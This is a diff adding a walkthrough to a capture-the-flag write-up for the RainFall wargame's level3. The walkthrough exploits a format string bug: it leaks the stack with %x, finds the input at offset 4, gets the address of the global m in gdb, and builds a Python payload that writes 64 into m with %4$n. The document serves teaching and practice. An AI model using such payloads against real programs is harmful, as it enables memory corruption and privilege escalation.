@@ -160,3 +160,68 @@ but this got a catch, if we got arguments!!! if dont we are just going to start 
 
 so now we got both mechannics first lets see how the stack is made, and where our printf intput is being put 
 
+the process of the program is the following,
+
+take the input (with a cap in the lenght)
+
+print the input literally,
+
+so lets map how the heap is being displayed
+
+to do that lets put a bunch of %x %x %x to map the values in the stack in a visible way
+
+
+as we can see in the output 
+level3@RainFall:~$ ./level3 
+%x %x %x %x %x %x %x %x %x %x %x %x
+200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520
+
+at some point we are mirroring the input of the print f in memory 
+
+25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 a782520
+
+te be even more sure we can put some kind of mark to know where we at, like for example a aaaa
+
+level3@RainFall:~$ ./level3 
+aaaa %x %x %x %x %x %x %x %x %x %x %x %x
+aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
+
+as you can see in the argument number 4 we are seeing the 61616161, we see the stack as arguments because the printf was not protected doing the 
+
+printf(%s, buffer)
+
+so we can explore the whole stack and its values,
+
+so we can see in the 61616161 we are starting our printf input argument
+
+so lets use this to exploit the system, 
+
+we need to write 64 into the global var m, we got the adress of m
+
+level3@RainFall:~$ gdb level3
+(gdb) info variable m
+All variables matching regular expression "m":
+
+Non-debugging symbols:
+0x08049884  completed.6159
+0x0804988c  m
+
+
+so lets build the payload 
+
+the adress = 0x0804988c 
+the value needed = 64
+and the flags to read the n argument and write there the value
+%(number)$n
+the offset in the stack for our printf intput
+is 4
+
+so 
+
+0804988c
+
+python -c 'print "\x08\x04\x98\x8c"[::-1] + "A"*60 + "%4$n"' > payload
+
+
+
+
